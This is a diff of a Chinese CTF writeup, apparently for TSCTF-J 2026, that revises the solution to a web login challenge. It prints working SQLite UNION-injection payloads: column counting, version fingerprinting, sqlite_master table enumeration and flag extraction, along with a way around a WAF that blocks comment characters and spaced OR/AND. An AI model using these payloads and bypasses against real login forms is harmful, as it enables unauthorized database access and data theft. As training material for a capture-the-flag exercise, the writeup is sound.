@@ -1,6 +1,7 @@
 ---
 title: TSCTF-J 2026 Writeup
 published: 2026-10-16
+updated: 2026-10-23
 description: TSCTF-J 2026 部分题解
 tags:
   - WP
@@ -179,48 +180,100 @@ kali输入 `openssl s_client -connect <host:port>` 进入环境
 
 ## 题目：好想玩原神
 
-进环境后F12看源码发现有账号密码
+### 正文
+
+进题目，一个简单的登录页面
+
+![alt text](image.png)
+
+先F12看源码
+
+发现注释有账号密码
+
 ![alt text](image-14.png)
 
-随便输入一个发现能正常登陆，但无其他可用内容
+随便填入一个给定的账号密码可正常登陆，但后续页面无其他可用信息
 
-回到登陆页面，猜测SQL注入，在账密输入
+回到登陆页面
+
+用dirsearch扫一遍
+
+![alt text](image-6.png)
+
+在/robots.txt处发现
+
+    User-agent: * Disallow: /api/login # Ordinary travelers are forwarded to the official launcher. # The legacy login gateway still renders selected account rows.
+
+**「旧版登录网关仍会渲染选定的账户行」** 说明登录界面就是漏洞点，并且带渲染回显，猜测可以尝试使用UNION进行SQL注入而非盲注
+
+在账密输入
 
     1
     1
-发现页面跳转 ~~（到底谁想出来的直接跳转到原神官网）~~
+
+被重定向到原神官网，burp抓包到`"redirect":"https://ys.mihoyo.com/main/?from_fab=1"` ~~（到底谁想出来的）~~
 
 输入
 
     1'
     1'
-发现页面无回显，在Burp可见响应内容
+
+发现页面无回显，Burp抓包响应内容
 
     {
         "detail":"OperationalError"
     "error":"登录网关解析失败"
     }
-判断存在SQL注入点
 
-通过Burp爆破得知存在WAF
+说明引号闭合被破坏，SQL注入点存在。
+
+先**测列数**，通过在**密码**区（账号区好像不行）输入payload`1'UNION SELECT 1,2,4,'3`得到回显
+
+    "adventure_rank":4,
+    "phone":1,
+    "server":"3",
+    "traveler":2
+
+接着确认数据库类型，把`4`换成`database()`变成了**网关错误**，接着换成`sqlite_version()`得到回显
+
+    "adventure_rank":"3.46.1",
+    "phone":1,
+    "server":"3",
+    "traveler":2
+
+所以是SQLite数据库类型，而SQLite库默认是**sqlite_master**，所以直接`1' UNION SELECT name,2,3,4 FROM sqlite_master WHERE type='table`查有哪些表,得到
+
+    {"adventure_rank":3,"phone":"accounts","server":4,"traveler":2},{"adventure_rank":3,"phone":"secret_flags","server":4,"traveler":2},{"adventure_rank":3,"phone":"sqlite_sequence","server":4,"traveler":2}
+
+接下来就是查表**secret_flags**有的字段名。用`1' UNION SELECT sql,2,3,4 FROM sqlite_master WHERE name='secret_flags`得到回显
+
+    CREATE TABLE secret_flags ( id INTEGER PRIMARY KEY AUTOINCREMENT, flag_value TEXT NOT NULL, note TEXT NOT NULL )
+
+接着`1' UNION SELECT flag_value,2,3,4 FROM secret_flags WHERE '1'='1`查字段**flag_value**的值
+
+得到具体flag：**TSCTF-J{Y@u_c4N_9l4|_G3n5he^!}**
+
+### 后日谈
+
+这道题的坑挺多的感觉
+
+ 1. 所有的**SQL报错**全部换成了**OperationalError**，容易让人迷失方向
+ 2. `--`，`#`，`/*`三种注释符全被拦如果想换成**逻辑运算**闭合末尾单引号的话会发现`OR(两侧带空格)`，`AND（两侧带空格）`也被拦了
+
+所以对于原函数末尾单引号的处理需要一定的技巧，不能使用**用注释符注释掉后面内容**的payload，也不能使用逻辑运算，只能通过**结尾是单引号的payload**去进行注入
+
+此为WAF响应抓包：
 
     {
         "error":"blocked by login firewall",
     "redirect":"https://ys.mihoyo.com/"
     }
 
-不断测试WAF词后，得到不会被WAF的payload `1'UNION SELECT 1,sqlite_version(),3,4||'1'='1` 得到回显
+### 总结：
 
-![alt text](image-15.png)
+总的来说这道题真的很可以，个人觉得质量极佳，一开始本人绕了很大的弯子，后面回顾的时候才发现自己绕了路。
 
-知本题为SQLite数据库类型
+### 学到的知识：
 
-继续构造payload `1'UNION SELECT 1,(SELECT group_concat(name) FROM sqlite_master WHERE type='table'),3,4||'1'='1` 得到所有表
-
-    accounts,sqlite_sequence,secret_flags
-构造payload查**secret_flags** `1'UNION SELECT 1,(SELECT sql FROM sqlite_master WHERE name='secret_flags'),3,4||'1'='1` 得到字段
-
-    CREATE TABLE secret_flags ( id INTEGER PRIMARY KEY AUTOINCREMENT, flag_value TEXT NOT NULL, note TEXT NOT NULL )
-构造payload查**flag_value** `1'UNION SELECT 1,(SELECT group_concat(flag_value||':'||note) FROM secret_flags),3,4||'1'='1` 得到
-
-    TSCTF-J{Y@u_c4N_9l4|_G3n5he^!}:派蒙把真正的通行证记录塞进了这里。
+1. 多种多样的payload形式（也没有完全记住，后续会单开一个专题）
+2. （待更新，去面试了）
